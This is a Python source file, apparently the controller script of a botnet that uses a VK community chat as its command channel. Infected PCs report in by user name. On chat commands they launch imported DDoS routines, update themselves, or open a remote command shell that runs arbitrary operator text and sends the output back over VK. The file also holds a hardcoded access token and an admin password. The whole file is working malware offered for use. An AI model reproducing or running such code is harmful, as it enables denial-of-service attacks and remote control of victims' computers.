from MainDDoS import mainDDoS
from SecondDDoS import secondDDoS
from POSTGET import message
from CMD import cmd
from Updater import update
from vk_api import VkApi
from vk_api.longpoll import VkLongPoll, VkEventType
from getpass import getuser
import os, sys

current_ver = 1.2
token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a0f6f1ff452c28d91003cfce' # Community token

vk_session = VkApi(token=token) # "Run" your community
vk = vk_session.get_api() # Begin work with API
longpoll = VkLongPoll(vk_session) # Longpoll makes that community recive messagess

if (update(current_ver) == 1): # When launched check for new updates
    sys.exit()

name = getuser() # Name = name of your PC

message("Новый пользователь в сети, введите логин и пароль или введите '""Check""' для активации бота") # Notification about running programm

# Cycle that takes messages
for event in longpoll.listen():
    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text: # if you send message
        if event.text == name + ' 16080305': # if message is your PC name + password
            # Shown all commands
            message('Вход выполнен - ' + name)
            message("Команды: ")
            message('DDoS - войти в DDoS панель')
            message('Check - проверить появились-ли новые боты')
            message('Имя бота + cmd - командная строка')
            message('online - боты онлайн')
            message('version - версии всех ботов')
            message('Имя бота + update - обновить версию бота')
            for event in longpoll.listen(): # Wait for next command
                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                    if event.text == 'DDoS':
                        mainDDoS() # Run mainDDoS - with notification
                    elif event.text == 'online':
                        message(name + ' - Админ онлайн') # Show all bots online
                    elif event.text == 'version':
                        message("Админ " + name + ": " + current_ver)  # Show all bots online
        elif event.text == 'Check': # if you logined as admin you type Check and other BotNETs will logined as bots
            message('Бот в сети! - ' + name)
            for event in longpoll.listen(): # Wait for next command
                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                    if event.text == 'DDoS':
                        secondDDoS() # Run secondDDoS - without notification
                    elif event.text == 'online':
                        message(name + ' - онлайн') # Show all bots online
                    elif event.text == 'version':
                        message("Бот " + name + ": " + str(current_ver)) # Show all bots versions
                    elif event.text == name + " update":
                        message("Обновляем...")
                        if (update(current_ver) == 1): # Update Bot if it wasn't updated earlier
                            os.abort()
                        else:
                            message("Последняя версия уже установленна.")
                    elif event.text == name + ' cmd': # Turns on CMD on selected bot
                        message(cmd("cd"))
                        message('Для выхода введите "Выход"')
                        for event in longpoll.listen():  # Wait for next command
                            if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                if event.text != "Выход": # If message != Выход
                                    command = '"' + event.text + '"' # String that format text
                                    try: # If by doing command we have errors program write report to user
                                        if (event.text == "cd"): # If you want to change directory - you write cd
                                            message('Введите директорию. Для выхода введите "Назад"')
                                            for event in longpoll.listen():  # Wait for next command
                                                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                                    if event.text != "Назад":
                                                        os.chdir(event.text) # Change directory to message directory
                                                        break
                                                    else:
                                                        message("Выходим...") # Else exit and break cycle
                                                        break
                                        message(cmd(command))
                                    except:
                                        message("Произошла ошибка. Попробуйте еще раз...") # Crush report
                                else:
                                    message("Выходим...") # If message == "Выход"
                                    break
